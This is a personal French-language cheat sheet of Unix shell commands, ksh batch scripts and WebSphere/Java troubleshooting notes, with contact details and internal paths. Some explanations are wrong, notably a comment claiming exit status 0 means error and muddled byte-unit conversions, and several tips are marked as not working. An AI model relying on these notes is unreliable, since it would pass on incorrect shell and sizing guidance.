      alias gotomodule='cd /var/www/www.wenhuaduverge.com/shop/module'
  puis vi ~/.bashrc
      if [ -f ~/.bash_aliases ]; then
        . ~/.bash_aliases
      fi
pour recharger un environnement faire cd . (la il y a des fichiers environnement(faire ls -tral pour voir tout) dont le nom est par ex: .env_machin) puis . .env_machin ou . ./.env_machin
pour verifier que "truc" est bien dans l'environnement faire: env | grep truc

pour faire un fichier qui charge un environnement: par exemple oracle: 
                  faire un ksh nomme .env_ora10 dans lequel il y a :
                  export ORACLE_HOME=/logiciel/oracle_client/client_10203
                  export LD_LIBRARY_PATH=$ORACLE_HOME/lib
                  export TNS_ADMIN=/fo-rs3minute/oracle
                  export PATH=.:$ORACLE_HOME/bin:$PATH
                  export NLS_LANG=FRENCH_FRANCE.UTF8
compter le nombre de lignes dans un fichier:
  wc -l nomdufichier ou bien nb_lignes=`cat $VARIABLEPATH/monfichier.xls | wc -l`
pour convertir d'un encodage a un autre un fichier :  (marche pas encore...)
iconv -s -f ASCII -t UTF-8 script_db_v120.sql test.sql
iconv -f ASCII -t UTF-8 monFichierEntree -o monFichierSortie
pour lire un fichier (comme more mais lit tout direct)
		cat
		exemple util pour recuperer des bribes de fichier
		cat dfcORIGIN.dat | grep QBJ014294 > dfc.log
		cat solORIGIN.dat | grep QBJ014294 > sol.log
		cat queORIGIN.dat | grep QBJ014294 > que.log
		cat que*.dat | grep QX90013790 > que.log
tail et head exemples :
			head -10 que.dat > toDelete.log
		  tail -10 SystemErr.log > toDelete.log
		  tail -f file1 & tail -f file2 // pour tail sur plusieurs multiple fichiers files. Si on fait entrée meme si il redonne le prompt en fait il continue à tailer.
		  tail -1000f toto.log // tail f en même temps que -1000
		  tail -f * | grep 'verify Signature idpname'
pour quitter un manuel man : 
		faire q
si a l'execution d'un script sh j'ai ca: cannot execute binary file
		faire: file mon_fichier
		il va donner l'encodage de mon fichier.
on peut voir les hosts sous /etc/hosts
les droits utilisateurs sous /etc/hosts.allow
env pour voir les variables d'environnement
pour setter les variable d'environnement:
  sur unbuntu si c une nouvelle variable: 
    export MA_VAR = toto
  si on edite une variable existante : 
    MA_VAR=titi
  mais ca ca ne marche que pour la session du moment. Pour que ca persiste il faut editer sous 
  $HOME/.profile 
    
dans /usr/bin noramlement (on peut retrouver dans les variables d'environnement) on voit tous les programmes que le user peut utiliser (.exe) (les commandes)
pour voir la liste des alias, tapper alias (permet de voir les raccourcis de commandes)

commande unix: ifconfig -a determine adresse ip(nonfixe) (equivalent windows = ipconfig)(adresse ipv4 donne une valeur qui bouge) //pour une valeur ipfixe : un appel à https://httpbin.org/ip = http://www.mon-ip.com/
les droits : 
    r=4
    w=2
    x=1
    r-x = 4+0+1=5
    user group other
    rwx rwx r-x = 775
    lorsqu'on cree un repertoire ou un fichier le umask s'applique voir umask
pour modifier les droits:
    chmod -R 755
    read r 4
    write w 2
    Execute x 1
    u proprietaire (user)
    g groupe (group)
    o les autres (other)
    a tous (all)
    chmod -R a+r *
    chmod -R a+r nomrep
		chmod -R 755 dossier
		chmod - 755 fichier

chown :
chown [-R] utilisateur fichierOuRepertoire (-R pour recursif)
chown [-R] utilisateur:groupe fichierOuRepertoire (-R pour recursif)

tar tvf ... pour visualiser le tar
tar tvf ... | grep -i toto* pour afficher le fichier toto* dans le tar
tar xvf ... pour extraire (attention parfois ne marche qu'avec un seul argument : pas mettre de chemin)
tar cvf ... pour compresser ou cvzf pour compresser en gzip
tar -cvf aps95.tar aps95 compresse le REPERTOIRE aps95
pour tarer en compressant: tar -zcvf repertroire.tar.z repertoire
grep chainedecaracteres nomfichier
grep -i chainecaracteres nomfichier........... -i pour ignorer la case
grep 'chainecaracteres' nomfichier1 nomfichier2 nomfichier3 JE NE PENSE PAS QU ON EST BESOIN DE METTRE DES GUILLEMENTS
grep 'chainecaracteres' * ... pour rechercher dans le repertoire en cours une chaine de caractere de maniere recursive
grep -v 'abcd$' pour faire une recherche de tout sauf ce qui se termine par abcd exclure
    grep -r 'chainecaracteres' * ... pour chercher dans le repertorie en recursif
    si ca ne marche pas on peut faire ca :
      find "$PWD" -name '*.fitreFichier' | xargs grep 'chainedecaractere'
      ou
      find "$PWD" | xargs grep 'chainedecaractere'
      ou tous
      find . | xargs more
    avant:
      ls | xargs grep 'chainedecaracteres'
pour trouver certain fichiers et n'afficher que certains fichiers de ces fichiers trouves
		find . -name 'MR*' | xargs grep 'chainedecaracteres'
pour trouver des noms à l'inverse opposé non pas 
    find . -not -name '*.mp3' -not -name '*.ogg' -not -name '*.txt' -not -name '*.draw' -not -name '*.m' -not -name '*.zip' -not -name '*.js' -not -name '*.html' -not -name '*_*' -not -name '*.png' -not -name '*.wav' -not -name '*.xls' -not -name '*.bmp*' -not -name '*.jpg' -not -name '*.sh'
    -maxdepth 1 pour que la recursivité s'arrete là ou je suis ?        
pour effacer les fichiers trouves
		find ouca -name '*toto*' | xargs rm (je ne peux pas faire -i ici)
trouver un repertoire :
      find . -type d(f pour fichier) | grep -i runtime //-i: ignore casse		
pour trouver des repertoires et fichiers et les effacer les repertoires trouves
		find ouca -name '*toto*' | xargs rm -r (je ne peux pas faire -i ici)
pour trouver les fichiers accede aujourd'hui
		find ouca -atime 0 (si 3 c a d les trois derniers jours)  2>/dev/null (pour ne pas être pollue par les messages d'erreur du style permission-denied)
pour trouver les fichiers modifie aujourd'hui
		find ouca -ctime 0
pour trouver plusieurs noms possibles:
		find ouca -name '*toto' -o -name '*titi'       Exemple: find . -name '*tif' -o -name '*xml'
pour trouver log* de manière recursive (meme find . cherche en recursif)
		find * -name 'log*'
pour trouver les fichiers plus grands que 2kb je crois
		find . -size +2 
umask : quand on cree un repertoire le umask s'applique. Pour voir mon umask faire
    umask
You could try this. The following will give a list of files between 2 dates. 
		use: touch -t [YY]MMDDhhmm filename (touch creer un nouveau fichier!!!)
		touch -t 200310310000 fichiervidecree2
		find /yourdir -type f -newer fichiervidecree1 -print > LIST1   (-type f pour fichier regulier...pas indispensable?)
		find /yourdir -type f -newer fichiervidecree2 -print > LIST2
		diff -y LIST1 LIST2 // -y pour comparer cote a cote c'est mieux
		diff -yarq folder1 folder2
pour trouver des repertoires: 
    find . -type d
pour voir la difference entre deux fichiers :
		diff LIST1 LIST2
pour voir la difference entre deux repertoires :
    diff -rq rep1 rep2 (r:recursif, q:bref) attention je crois qu'il dit que c different si seulement les dates different. Trouver la bonne option
    		 -a pour voir les fichier comme des textes? jamais essaye
If you want a list from a given date to now, you just need 
		touch -t 201802140000 fichiervidecree
        find /yourdir -ctime 0 // liste des fichiers modifies date d'aujourd'hui
		find /yourdir -type f -anewer fichiervidecree (marche pas :-( )
pour copier les fichiers trouves dans un autre repertoire
		find /starting/dir -iname '*.jpg' | xargs -xi cp '{}' /backupdir
		find . -atime 0 | xargs -xi mv '{}' temp (copier ailleurs les fichiers date aujourd'hui)
		ls $1 | xargs -I {} -t mv $1/{} $2/{}
		--->find . -type f -anewer aeffacer | xargs -I {} -t cp {} /home00/mntegn/aeffacer ( on peut mettre -r à l'option du cp si on veut aussi copier les repertoires)
for fichier in `find . -type f -newer aeffacer` ;do cp --parents $fichier /home00/mntegn/aeffacer ;done
les differents types de scripts: ksh sh bash ont chacun leur env propre. sh est plus portable et ksh offre plus de fonctions
bash est mieux que sh car plus utilisateur
sous unix pour pouvoir faire escape K et ne plus avoir d'emmerdes quand on fait une suppression il faut faire ca: definir les variables d'environnement 
					cd . ou bien cd
					puis vi .profile ou bien dans /root(ou mon user)/.bashrc 
					puis ecrire le fichier de maniÅ re à ce qu'il ressemble à ca: 
										#Start Modify  by Christian SIVA
										export 
										=./:$PATH
										stty erase "^H" kill "^U" intr "^C" eof	"^D"	c'est cette commande qui permet de'utiliser echap k
										stty hupcl ixon ixoff
										tabs
										# Set up the shell environment:
										set -u
										trap "echo 'logout'" 0
										# Set up the shell variables:
										export EDITOR=vi
										alias ll='ls -la'
										export JAVA=/usr/local/java/bin/java
										#end modification
										. /logiciel/config/setenv
										~
Pour executer un fichier: . fichieraexecuter.cfg (ou .sh ou whatever)
inferieure à  : lt 
supperieur à   : gt
egal : eq
pour recharger le .profile faire: cd ou cd . puis . .profile (faire ls -tral pour voir tout (attention pas tout forcement... mais je ne sais pas pourquoi)
pour recharger un environnement faire cd . (la il y a des fichiers environnement(faire ls -tral pour voir tout) dont le nom est par ex: .env_machin) puis . .env_machin ou . ./.env_machin
pour verifier que "truc" est bien dans l'environnement faire: env | grep truc
les comptes utilisateurs sont sur etc/password (si un jour un gars qu'on ne connait pas fait des trucs)
SUPER methode pour trouver les plus gros fichiers : 
du -sk -h * | grep '[0-9\.]\+[M;G]'
du -sh * c'est mieux c'est plus clair ou du -sh . pour voir la taille du repertoire courant
du -s -k -h * : permet de voir la taille espace du repertoire courant: en kilo. (-h pour voir si c M ou G ...)
du -s -m * : en MEGA 
ou 
du -sk * : permet de voir la taille de chacun des repertoires en dessous
trouver les plus gros fichiers : 
find . -type f -size +14096c
find . -name '*ora'
df -h . pour voir combien il reste de place là ou on est situe. Plus clair que df -k
df -k pour voir si il y a de la place dans les systemes de fichiers. le pourcentage = espace utilise je suis sur.
  convertisseur : http://mon-ip.awardspace.com/convertisseur.php (ne pas mettre espaces)
    1 octet = 1 byte = 8 bits
		Un kilooctet (ko) = 2^10 octets = 1024 octets
    Un Megaoctet (Mo) = 2^20 octets = 1024 ko = 1048576 octets    = 1024 ko donc 252132=252Mega = 1024 ko
    Un Gigaoctet (Go) = 2^30 octets = 1024 Mo = 1073741824 octets = 1024 Mo
    Un Teraoctet (To) = 2^40 octets = 1024 Go = 1099511627776 octets 1024 Go
			
			1 Mo devrait suffire (1 xxx xxx)
			1.000.000   = 1Giga Go
			1.000 kilo = 1 Mega Mo
si j'ai le message :quota_ufs: over hard disk limit (pid 8968, uid 2024, inum 24683, fs /appli01) sous les systemes de fichiers il y a des application et chacune a un quota
      quota -v ou /usr/sbin/quota -v pour savoir si on a depasse le quota d'occupation du disque ou de l'application
    
pour parametrer ce qui doit se lancer automatiquement au demarrage
  ls /etc/rc2.d dans ce repertoire on voit tout ce se lance automatiquement quand on rentre dans le runlevel 2 (etc pour 3 pareil...)
  pour mettre à jour la prog d'un demarrage d'un service lors du demarrage du serveur: update-rc.d mysql defaults (par exemple)
pour savoir ce qui tourne:
(ps -fu ? ou)ps -ef | grep monnomutilisateur pour voir quelles instances que j'ai lance tournent (affiche les ports)
on peut ensuite faire un kill -15 (soft) ou -9 (hard) sur l'id qu'on veut killer ( premiere colonne en chiffres (PID)) ferme aussi le port du service du coup
ps -ef donne aussi la date de debut d'execution du process
ps -ef | grep whatever pour voir si whatever tournent
renvoit le nombre de process qui repondent a la recherche:
      ps -ef | grep whatever | wc -l 
pour localiser une commande grace au path: which nomdelacommande
pour connaitre l'heure: date
si on a l'erreur sh: cannot execute
regarder si on a les droits d'execution sur les fichiers
Lancer une commande direct en background: commande & arriere plan
nohup (faire man nohup) sert à pouvoir quiter sans arreter le processus. Avec KhornShell qd on fait "exit" on a une fois le message: "you have jobs running" il suffit de faire exit une deuxieme fois pour quitter qd meme car c juste un warning.
             nohup DDD_ExportPHX_run_all.ksh dctre711 & (NE PAS OUBLIER CA A LA FIN)
              puis tail -f nohup.out
              avec Ctr+Z tu meets juste en background arriere plan 
              et le process n'est pas immunise contre le signal hangup
              avec nohup ton process est entierement autonome
              comme un service xwindow
unix who: pour voir qui lance des process (qui est logge)
cp -p pour faire une copie en gardant les droits et le groupe
copier des repertoires de maniere recursive:
  cp -r repSource repDest
quand on fait ">" on ecrase on effacer un fichier, quand on fait ">>" on ecrit à  la suite
    
ls recursif: ls -R
ls trie par taille: ls -ls
ls -tral : taille: exemples: 8565 octets = 9 kilo mais c indique en octets
export: dans un script, ne marche que si on execute ce script en tappant: . ./Script.ksh (dans Script.ksh il y a par exemple: export TOTO=machin) 
cd - pour revenir au repertoire precedent
rappeler commande precedente si fleches ne marchent pas : escape+k
ln -s pour creer un lien symbolique: 
    ln -s nom_de_l_element_vise nom_effectif_du_lien
    attention si un lien du meme nom existe deja il faut d'abbord l'effacer sinon ca fait un peu n'imp
ln nom_de_lelement_vise nom_effectif_du_lien : hard link : c a d qu'on va voir deux fichiers distincts mais ca prend la place que d'un seul fichier. Et si seulement on efface LES DEUX FICHIERS alors le lien disparait. Pratique pour gagner en espace.    
Ctrl C = kill // si c'est un manuel et il utilise less pour lire les man il faut faire q
Ctrl D = ? forcer l'arret
Ctrl Z = stop et met en tache de fond
                mais si tu coupes ta session ça tue le process
                contrairement à nohup permet de te mettre vraiment en mode arrire plan
                et si on tues le shelle pere, ou tues les shells fils
puis
bg = pour mettre en background (le programme stoppe en tache de fond redemare en tache de fond) arriere plan
puis
jobs = pour regarder les taches mises en background
fg pour le remettre en foreground (ou fg %numerodetache)
pour killer un job: kill -9 %1 (ne pas oublier le "%" et remplacer 1 par le numero du job qu'on veut killer (c pas le pid du job c son numero si on met %)) kill -15 (soft) ou -9 (hard)
mpstat pour voir ce qui tourne et cpu utilise memoire utilisee
prstat idemn
top idemn mais encore mieux... on peut l'installer facilement en le recuperant sur SUN top (sun.com, package top ou prstat si on veut). Faire tab+p pour classer conso mem cpu par ordre decroissant
    ensuite faire maj+m pour trier par ordre decroissant sort.
free pour voir si mon disque swap beaucoup trop (on peut voir la qte de memoire virtuelle dispo/utilisee et le swap qui ne doit pas depasser 56xxx=56Mega) 
a utiliser pour regarder si CPU sature.: avec top on peut recuperer un ID de process... faire un kill -15 dessus par ex.
pour savoir combien j'ai de coeurs cpu
    cat /proc/cpuinfo | grep processor | wc -l
uptime= voir quand la machine a ete lancee
prtding = voir matos et etat du matos et nombre de processeurs
pour savoir quelles sont les dernieres commandes saisies historique des commandes :
        en bash: 
            commande unix: history 10 permet de savoir quels sont les 10 dernieres commandes saisies. par contre rappeler une commande par son ID trop complique.. utiliser fc LES ID SONT LES MEMES que history
            pour masquer les commandes inutiles dans history : 
              export HISTIGNORE='ls:ls -tral:pwd:cd'
        en ksh:
            fc -l
            fc -l 500
pour reexecuter rerun une commande saisie :
        en ksh: 
          fc -s numCommande (apres un fc -l pour avoir le numCommande)        
        escape k pour rappeller la derniere commande puis A pour aller à  la fin de cette commande. si ca ne marche pas taper: set -o vi
Si quand on veut lancer un ksh: ./TOTO.ksh il fait : ksh not found ou no such file aucun fichier ou dossier de ce type 
      essayer de le lancer comme ca: . ./TOTO.ksh ou bien c'est la version unix qui ne supporte pas cet executable: upgrader version unix
      voir aussi LINKf9t8p2
awk: pour definir des tooken dans un string: on peut travailler dans des fichiers.
      $TOTO= `echo $ligne | awk -F'mon_separateur' '{ print $2 }'` ## prendre element apres deuxieme separateur
mkdir pour creer un repertoire. 
    Possibilitee de creer plusieurs repertoires recursivement en un coup: mkdir -p toto/titi/tata
cal [-jysm13] mois annee. pour afficher date calendrier
pour changer le groupe de mon fichier:
chgrp [-R] nomgroupe nomfichierOuRepertoire -R pour recursif
plour savoir a quelle groupe un user appartien :
id username
pour compter le nombre de lignes renvoyees par un find par exemple: find . -name 'R*.xml' | wc -l
uname -a nom machine etc...
stty: (config clavier)
xterm (x terminal) (peut etre besoin faire un export display avant?)
si je veux  voir ce qui a dans un .jar: jar -tvf nomdujar.jar | more
pour extraire tout le jar: jar -xvf nodujar.jar (je pense: xvf)
sous unix on peut faire une liste de commandes separees par un ";"
pour tarer: tar -cvf nouveau.tar * ( quand il y a des espaces il faut mettre des guillemets: tar -cvf "2006101BABABAA-1000300_titre en francaisIncorrect.tar" "2006101BABABAA-1000300_titre en francaisIncorrect"
(pour detarer: tar xvf fichiertar chemin/vers/ou (attention parfois ne marche qu'avec un seul argument : pas mettre de chemin)
pour deziper: gzip -d fichiertar.gz)
pour deziper un tgz :tar -zxvf fichier.tgz
pour ziper: gzip fichiertar (le fichier doit etre un .tar au prealable)
pour ziper au maximum: gzip -9 fichiertar
tar -cvf nouveau.tar * ( quand il y a des espaces il faut mettre des guillemets: tar -cvf "2006101BABABAA-1000300_titre en francaisIncorrect.tar" "2006101BABABAA-1000300_titre en francaisIncorrect"
(pour detarer: tar xvf fichiertar chemin/vers/ou(attention parfois ne marche qu'avec un seul argument : pas mettre de chemin)
tar.xz est un type de compression puissant
    Creation
        tar -Jcvf votre_archive.tar.xz votre_dossier/
    Extraction
        tar -Jxvf votre_archive.tar.xz
deziper: unzip GroupNet.zip (on peut aussi deziper un ear et un war) PEUT ETRE besoin installer : apt-get install unzip
(pour compresser XXX.toto faire: compress  XXX.toto ca va donner un XXX.toto.Z à  ne pas confondre avec la commande unzip qui cree des .zip)
pour zipper ziper un fichier ziper: zip monfichier.zip *
pour zipper ziper un repertoire ziper : zip -r lenomdemonzip.zip * (* contient le repertoire.) -r pour zipper de manière recursive 


--------------

si on a ce genre d'erreur dans l'execution sous unix de programme de type traitement image: 
java.lang.InternalError: Can't connect to X11 window server using ':0.0' as the value of the DISPLAY variable.
        at sun.awt.X11GraphicsEnvironment.initDisplay(Native Method)
        at sun.awt.X11GraphicsEnvironment.<clinit>(Unknown Source)
        at java.lang.Class.forName0(Native Method)
        at java.lang.Class.forName(Unknown Source)
        at java.awt.GraphicsEnvironment.getLocalGraphicsEnvironment(Unknown Source)
        at sun.awt.motif.MToolkit.<clinit>(Unknown Source)
        at java.lang.Class.forName0(Native Method)
        at java.lang.Class.forName(Unknown Source)
        at java.awt.Toolkit$2.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.awt.Toolkit.getDefaultToolkit(Unknown Source)
        at com.sun.jimi.core.Jimi.getImage(Jimi.java:201)
        at com.sun.jimi.core.Jimi.getImage(Jimi.java:190)

 il faut essayer ca: 
 java -Djava.awt.headless=true -classpath JimiProClasses.jar:. convertisseur.Main

bash pour tarer tous les repertoires sous un repertoire script: 
        #!/bin/ksh             Linkkshsflk
        #-------------------------------------------------------------------------------#
        # FILE          : tarfile.ksh                                               #
        # AUTHOR        : Christian SIVA  christian.siva@free.fr                                                 #
        # CREATION      : 19/01/2007                                                    #
        # MODIFICATION  :                                                               #
        # DESCRIPTION   : Creating tar file  for each directory                                       #
        #-------------------------------------------------------------------------------#
        #
        ## Recuperation du nom du chemin/fichier
        ## ==============================
        #
        FicSRC=$1 ##sans espaces sinon marche pas
        //pour savoir si un repertoire existe (ou pas)
        if [ ! -r ${FicSRC} ] ## si le repertoire n existe pas
        then
                Log_print "Fichier :<$FicSRC> inexistant fin du traitement"
                Log_exit 0
        fi
        cd $FicSRC
        for DOSSIER in `ls -d *`
        do
                if [ -d $DOSSIER ]
                then
                   tar cvf $DOSSIER.tar $DOSSIER
                fi
        done 
        echo "End of Treatment "
      #-------------------------------------------------------------------------------#
      ********************************************+
Script KSH affichant une aide (comme une commande unix) : 
#!/usr/bin/ksh

#
# aide
# affiche une aide en ligne
#
function aide
{
        echo "Usage:ksh batchExportARCA.ksh [-init] anpqp"
        echo "  -init mode [re]initialisation"
        echo "Exemple:ksh batchExportARCA.ksh -init anpqp"
        echo "Lancàš sans paramàžtre, affiche l'aide"
}

# positionnement variable de retour 9=parametres incorrects
RET=9;
ARGS=;
# analyse des parametres d'entree (arguments)
if [ $# -eq 0 ] // si nombre d'argument = 0
then
        RET=9
else
        for arg in $*
        do
          case ${arg} in
                -init ) ARGS=`echo "${ARGS} -init"`;;

                anpqp ) ARGS=`echo "${ARGS} anpqp"`
                        RET=0;; #ok parametres au complet

                * )     echo "Argument invalide:$arg"
                                RET=9;;
          esac
        done

        if [ ${RET} -eq 0 ]
        then
 
********************************************+
Script KSH pour remplacer tous les codeCIble"" par codeCible"0"
fusage()
{
    echo " Parametre manquant: Ex: mpf_Renvoi.ksh Operation_Renvoi.xml"
}
//pour savoir si un parametre existe
if [ $# -lt 1 ] //recupere le permier parametre envoye et regarde si il n'existe pas. //ATTENTION respecter les espaces! $# c'est le nombre de parametres passe en ligne de commande. -lt c'est inferieur à; -gt: superieur à -eq egal à (on peut aussi faire = ou !=) 
then
        fusage
        exit 1
fi

. $HOME/admin/bib/Chemins.bib $* // ca on s'en fout c'est les normes Renault
. $HOME/admin/bib/Log.bib $*// ca on s'en fout c'est les normes Renault

#pour remplacer charactères
  sed -e "s/codeCible=\"\"/codeCible=\"0\"/g" $1 > $HOME/tfi/$1.tmp // pour le faire le remplacement directement sur le même fichier sed -i.bak -e "s/remplacemoi(/parca(/g" nomdemonfichier // ça cree par ailleurs un fichier .bak qu'il faudra supprimer apres
          ^               ^               ^
    // "/s"=remplacer. remplace ce qui ya après s/ (codeCible="") par (/) codeCible="0" /g: cad partout. $1= parametre: on ecrit le resultat dans $HOME/tfi/$1.tmp
    // du coup pour trouver certains fichiers et remplacer dans ceux trouver une chaine par une autre faire : 
            find . -type f -not -name '*.mp3' -not -name '*.bak'(important!) | xargs sed -i.bak -e "s/remplacemoi(/parca(/g"
ret=$?  // on defini ret etant le retour du sed ci dessus: peut etre =1 ou 0
if [ $ret -ne 0 ] // si ca ne renvoie pas 0 (0=erreur 1=OK)
        then
        Log_print " probleme remplacement des carecteres "
        exit $ret // exit 0
        fi

mv $HOME/tfi/$1.tmp $1
exit 0

cut : peut etre utilisé apres sed. sed.... | cut...
  cut -d 'unCharASupprimer' -f1 (-f1: supprimer aussi tout ce qui suit ce char) 
********************************************
bon exemplde ksh de lancement de batch: 
                      #!/bin/ksh
                      #-------------------------------------------------------------------------------#
                      # FILE		: PAE.ksh							#
                      # AUTHOR       	: Laurent Duverge						#
                      # CREATION     	: 15/10/2007							#
                      # MODIFICATION 	:                                        			#
                      #                	                                                        #
                      # DESCRIPTION  	: Lance le batch PAE						#
                      #-------------------------------------------------------------------------------#
                      . $HOME/vcour/paeBatch/cfg/Batch.cfg
                      echo "PAE_VERSION: " $PAE_VERSION
                      echo "PAE_LIB: " $PAE_LIB
                      echo "PAE_CMD: " $PAE_CMD
                      echo "JAVA_HOME: " $JAVA_HOME
                      echo "PAE_TRC: " $PAE_TRC
                      echo "PAE_VERSION: " $PAE_VERSION
                      echo "BATCH_NAME: " $BATCH_NAME
                      CLASSPATH=.:lib/mail-1.jar:lib/log4j-1.2.17.jar:lib/jojdbc-14.jar:conf/AccentureBatchProperties.properties:AccentureBatch.jar
                      export CLASSPATH
                      export PATH_BATCH=/applis/wecope01/wec/batch/vcour
                      cd PATH_BATCH // on doit faire ca car si c lance par une crontab il faut aller dans le bon repertoire
                      #Logging file
                      FIC_TRC_SQL=${PAE_TRC}/${BATCH_NAME}_`date '+%d%m%y'`.trc
                      cd $PAE_VERSION
                      echo $JAVA_HOME
                      echo "JAVA_HOME: " $JAVA_HOME >> $FIC_TRC_SQL
                      echo "Starting " $BATCH_NAME " batch at " `date `
                      echo "Starting " $BATCH_NAME " batch at " `date ` >> $FIC_TRC_SQL
                      $JAVA_HOME/java -Dlog4j.configuration=log4j.properties -classpath $CLASSPATH:. renault.pae.TestPaeBatch pae-batch
                      status=$?
                      echo "Ending " $BATCH_NAME " batch at " `date `
                      echo "Ending " $BATCH_NAME " batch at " `date ` >> $FIC_TRC_SQL
                      exit $status
              Ou batch.cfg est : 
              #!/bin/ksh
                                  #
                                  # Batch.cfg
                                  #
                                  # Fichier de positionnement des variables d'environnement
                                  # File for setup the environnment variables
                                  #
                                  # Remarques :
                                  #
                                  # - this file is called from .profile so please don't display any message otherwise BGF will be scratched.
                                  
                                  # GLOBAL VARIABLES
                                  BGF_VERSION=$HOME/vcour/bgfBatch
                                  BGF_LIB=$BGF_VERSION/lib
                                  BGF_CMD=$BGF_VERSION/cmd
                                  BGF_CFG=$BGF_VERSION/cfg
                                  export JAVA_HOME=/usr/j2re1.4.2_02/bin/ (il peut etre aussi sous /usr/local/java)
                                  export BGF_TRC=$BGF_VERSION/logs
                                  export BATCH_NAME='bgfBatch'
                                  CLASSPATH=.:$BGF_LIB/log4j-1.2.8.jar:$BGF_LIB/log4j-opc-1.0.2.jar:$BGF_VERSION/cfg/log4j.properties:$PAE_VERSION/jar/bgfBatch.jar
                                  
                                  export BGF_CMD
                                  export BGF_CFG
                                  export CLASSPATH  #important si on execute d'une crontab
                                  echo "*------------------- Batch.cfg termine -------------------*"
                      Avant c'etait:
                                    #!/bin/ksh
                                    #
                                    # Batch.cfg
                                    #
                                    # Fichier de positionnement des variables d'environnement
                                    # File for setup the environnment variables
                                    #
                                    # Remarques :
                                    #
                                    # - this file is called from .profile so please don't display any message otherwise PAE will be scratched.
                                    # GLOBAL VARIABLES
                                    PAE_VERSION=$HOME/vcour/paeBatch
                                    
                                    PAE_LIB=$PAE_VERSION/lib
                                    PAE_CMD=$PAE_VERSION/cmd
                                    export PAE_LIB PAE_CMD
                                    export JAVA_HOME=/usr/j2re1.4.2_02/bin/ (il peut etre aussi sous /usr/local/java)
                                    export PAE_TRC=/paedev01/pae/vcour/paeBatch/logs
                                    export BATCH_NAME='paeBatch'
                                    
                                    
                                    #PAE_PARAMETER_XML=`grep PARAMETER_XML $PAE_VERSION/cfg/config.properties | awk -F= '{ print $2}'`
                                    #JAVA SPECIFIC
                                    CLASSPATH=.:$PAE_LIB/activation.jar:$PAE_LIB/arca_53.jar:$PAE_LIB/datasource_40.jar:$PAE_LIB/fws.jar:$PAE_LIB/i18n.jar:$PAE_LIB/ojdbc14_9208.jar:$PAE_LIB/j2ee.jar:$PAE_LIB/ldap_41.jar:$PAE_LIB/log4j-1.2.8.jar:$PAE_LIB/log4j-opc-1.0.2.jar:$PAE_LIB/mail.jar:$PAE_LIB/mailapi.jar:$PAE_LIB/smtp.jar:$PAE_LIB/xercesImpl.jar:$PAE_LIB/xml-apis.jar:$PAE_LIB/rt.jar:$PAE_LIB/xml4j.jar:$PAE_LIB/pae-common.jar:$PAE_VERSION/cfg:$PAE_VERSION/cfg/log4j.properties:$PAE_VERSION/jar/paeBatch.jar
                                    
                                    export CLASSPATH #important si on execute d'une crontab
                                    echo "PAE_VERSION: " $PAE_VERSION
                                    echo "PAE_LIB: " $PAE_LIB
                                    echo "PAE_CMD: " $PAE_CMD
                                    echo "JAVA_HOME: " $JAVA_HOME
                                    echo "PAE_TRC: " $PAE_TRC
                                    echo "PAE_VERSION: " $PAE_VERSION
                                    echo "BATCH_NAME: " $BATCH_NAME
                                    echo "CLASSPATH: " $CLASSPATH
                                    echo "*------------------- Batch.cfg termine -------------------*"

----------


exm tel: 472660 appeler aussi si incident EGN
---------
Si je rajoutte une librairie dans groupnet, sur la mco, ca risque de ne pas marcher car le classpath doit etre defini aussi au niveau de la console de websphere: se connecter sur la console avec actlclient.sh et rajouter le jar dans le classpath

pour lancer websphere: faire export display et lancer adminclient.sh si ca marche pas parce que serveur arrete, lancer startupServer.sh puis adminclient.sh
-------

tickets resto la defense: 01 49 01 79 16 Michel levasseur


si probleme en prod de groupnet de type

[04.10.29 09:43:20:381 CEST] 101e30d WebApp        X Failed.to.initialize.webapp.{0}
                                 "GroupNET"
                                 javax.servlet.ServletException: Servlet [Navigator]: edf.groupNet.servlet.ApplicationNavigator was found, but is missing another required class.
This error typically implies that the servlet was originally compiled with a classes which cannot be located by the server.
Check your classpath to ensure that all classes required by the servlet are present.
  This problem can be debugged by recompiling the servlet using only the classes in the application's runtime classpath
Application classpath=[/logiciels/APP_EGN/WEB-INF/lib/jaxp.jar:/logiciels/APP_EGN/WEB-INF/lib/crimson.jar:/home00/oracle/Instances/EGN_WAS/oracle//jdbc/lib/classes12.zip:/logiciels/WebSphere3.5/AppServer/efix/pq50437.jar:/logiciels/WebSphere3.5/AppServer/lib/ibmwebas.jar:/logiciels/WebSphere3.5/AppServer/properties:/logiciels/WebSphere3.5/AppServer/lib/servlet.jar:/logiciels/WebSphere3.5/AppServer/lib/webtlsrn.jar:/logiciels/WebSphere3.5/AppServer/lib/lotusxsl.jar:/logiciels/WebSphere3.5/AppServer/lib/compat.jar:/logiciels/WebSphere3.5/AppServer/lib/xalan.jar:/logiciels/WebSphere3.5/AppServer/lib/ns.jar:/logiciels/WebSphere3.5/AppServer/lib/ejs.jar:/logiciels/WebSphere3.5/AppServer/lib/ujc.jar:/home00/oracle/Instances/EGN_WAS/oracle//jdbc/lib/classes12.zip:/home00/oracle/Instances/EGN_WAS/oracle//jdbc/lib/nls_charset12.zip:/logiciels/WebSphere3.5/AppServer/lib/repository.jar:/logiciels/WebSphere3.5/AppServer/lib/admin.jar:/logiciels/WebSphere3.5/AppServer/lib/console.jar:/logiciels/WebSphere3.5/AppServer/lib/was20cm.jar:/logiciels/WebSphere3.5/AppServer/lib/tasks.jar:/logiciels/WebSphere3.5/AppServer/lib/xml4j.jar:/logiciels/WebSphere3.5/AppServer/lib/vaprt.jar:/logiciels/WebSphere3.5/AppServer/lib/sslight.jar:/logiciels/WebSphere3.5/AppServer/lib/ibmjndi.jar:/logiciels/WebSphere3.5/AppServer/lib/deployTool.jar:/logiciels/WebSphere3.5/AppServer/lib/databeans.jar:/logiciels/WebSphere3.5/AppServer/classes:/logiciels/WebSphere3.5/AppServer/java/lib/wstools.jar:/logiciels/WebSphere3.5/AppServer/java/lib/tools.jar:/logiciels/WebSphere3.5/AppServer/lib/bsf.jar:/logiciels/WebSphere3.5/AppServer/lib/dertrjrt.jar:/logiciels/WebSphere3.5/AppServer/lib/derdbpw.jar:/logiciels/WebSphere3.5/AppServer/lib/ivjejb35.jar:/logiciels/WebSphere3.5/AppServer/lib/js.jar:/logiciels/APP_EGN/WEB-INF/lib/activation.jar:/logiciels/APP_EGN/WEB-INF/lib/cos.jar:/logiciels/APP_EGN/WEB-INF/lib/crimson.jar:/logiciels/APP_EGN/WEB-INF/lib/jakarta-commons-beanutils.jar:/logiciels/APP_EGN/WEB-INF/lib/jakarta-commons-collections.jar:/logiciels/APP_EGN/WEB-INF/lib/jakarta-taglibs-i18n.jar:/logiciels/APP_EGN/WEB-INF/lib/